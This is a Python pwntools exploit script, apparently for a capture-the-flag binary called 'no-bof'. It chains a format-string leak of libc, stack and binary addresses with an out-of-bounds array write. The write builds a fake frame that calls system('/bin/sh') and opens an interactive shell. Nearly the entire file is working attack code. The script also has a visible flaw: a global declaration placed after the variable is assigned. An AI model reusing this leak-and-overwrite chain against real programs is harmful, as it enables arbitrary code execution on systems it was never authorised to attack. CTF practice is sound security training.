from pwn import *

elf = ELF('no-bof')
#lib = ELF('x32_libc-2.19.so')
lib = ELF('/lib/i386-linux-gnu/libc-2.23.so')
context.arch = 'i386'

def leakAll():
	r.sendlineafter('Your input: ','4 %4$p %8$p %21$p \x00/bin/sh;')
	r.recvuntil('Your choice is:4 ')

def Insert(title,price):
	r.sendlineafter('Your input: ','1')
	r.sendlineafter('title: ',title)
	r.sendlineafter('price: ',str(price))
def Update(index,title,price):
	r.sendlineafter('Your input: ','2')
	r.sendlineafter('update?\n',str(index))
	r.sendlineafter('title: ',title)
	r.sendlineafter('price: ',str(price))
def Delete(index):
	r.sendlineafter('Your input: ','3')
	r.sendlineafter('delete?\n',str(index))
def pwn():
	r = process('./no-bof')
	global r
	leakAll()
	leak0 = r.recvuntil(' ')
	libase = int(leak0.strip(),16) - lib.symbols['_IO_2_1_stderr_']
	leak1 = r.recvuntil(' ')
	stack = int(leak1,16)
	leak2 = r.recvuntil(' ')
	wtbase = int(leak2.strip(),16)
	log.info('LIBC BASE -> '+str(hex(libase)))
	log.info('WRIT BASE -> '+str(hex(wtbase)))
	log.info('STACK ->'+str(hex(stack)))
	fuck_index = ((0 - elf.symbols['books'])-(0xffffffff - stack))/0x100
	log.info('FAKE INDEX = '+hex(fuck_index))
	fake_fill = ''
	x = (stack&0xf0)>>4
	if(x == 0xf):
		fake_fill+=p32(0xc)+p32(0xd)
		fake_fill+=p32(wtbase)
		fake_fill+=p32(0x22)+p32(0x16)
		fake_fill+=p32(0x0)
		fake_fill+=p32(libase+0x1b0000)
		fake_fill+=p32(stack)
		fake_fill+=p32(libase+lib.symbols['system'])
		fake_fill+=p32(0xdeadbeef)
		fake_fill+=p32(wtbase+19)
	else:
		print 'GG'
		r.close()
		pwn()
	Update(fuck_index,fake_fill,0xf8)
	r.interactive()

pwn()

